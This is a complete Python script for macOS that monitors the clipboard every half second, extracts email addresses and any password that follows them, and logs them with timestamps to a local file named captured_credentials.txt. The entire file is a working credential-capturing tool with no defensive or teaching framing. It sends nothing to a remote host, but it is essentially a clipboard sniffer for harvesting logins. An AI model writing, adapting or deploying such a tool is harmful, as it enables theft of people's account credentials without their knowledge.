import re
import time
from datetime import datetime
import os
import subprocess


SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_FILE = os.path.join(SCRIPT_DIR, "captured_credentials.txt")

def get_credentials(text):
    """Extract email + password pairs from text"""
    email_match = re.search(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', text, re.IGNORECASE)
    if not email_match:
        return None, None
    

    password_patterns = [
        r'(?:password|pass|pwd)[:\s]*([^\s]+)',  
        r'\n\s*([^\s]+)',                         
        r'[\s:]+([^\s]+)'                         
    ]
    
    for pattern in password_patterns:
        password_match = re.search(pattern, text[email_match.end():], re.IGNORECASE)
        if password_match:
            return email_match.group(), password_match.group(1)
    
    return email_match.group(), None

def get_clipboard():
    """Get clipboard content using macOS pbpaste"""
    try:
        return subprocess.run(['pbpaste'], 
                           capture_output=True, 
                           text=True).stdout.strip()
    except:
        return ""

def main():
    last_clipboard = ""
    

    try:
        with open(OUTPUT_FILE, "a"):
            pass
    except PermissionError:
        print(f"❌ Error: Cannot create file at {OUTPUT_FILE}")
        print("Please check folder permissions")
        return
    
    print(f"🔍 Monitoring clipboard for credentials")
    print(f"📂 Saving to: {OUTPUT_FILE}")
    print("📋 Supported formats:")
    print("  user@gmail.com\n  Pass123!")
    print("  Email: user@gmail.com Password: Pass123!")
    print("🛑 Press CTRL+C to stop\n")
    
    try:
        while True:
            current = get_clipboard()
            if current and current != last_clipboard:
                email, password = get_credentials(current)
                
                if email:
                    with open(OUTPUT_FILE, "a") as f:
                        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n")
                        f.write(f"Email: {email}\n")
                        if password:
                            f.write(f"Password: {password}\n")
                        f.write("\n")
                    
                    print(f"✅ Captured credentials:")
                    print(f"   Email: {email}")
                    print(f"   Password: {password}" if password else "   (No password detected)")
                
                last_clipboard = current
            time.sleep(0.5)
    except KeyboardInterrupt:
        print(f"\n🛑 Monitoring stopped")
        print(f"📄 Full log saved to: {OUTPUT_FILE}")

if __name__ == "__main__":
    main()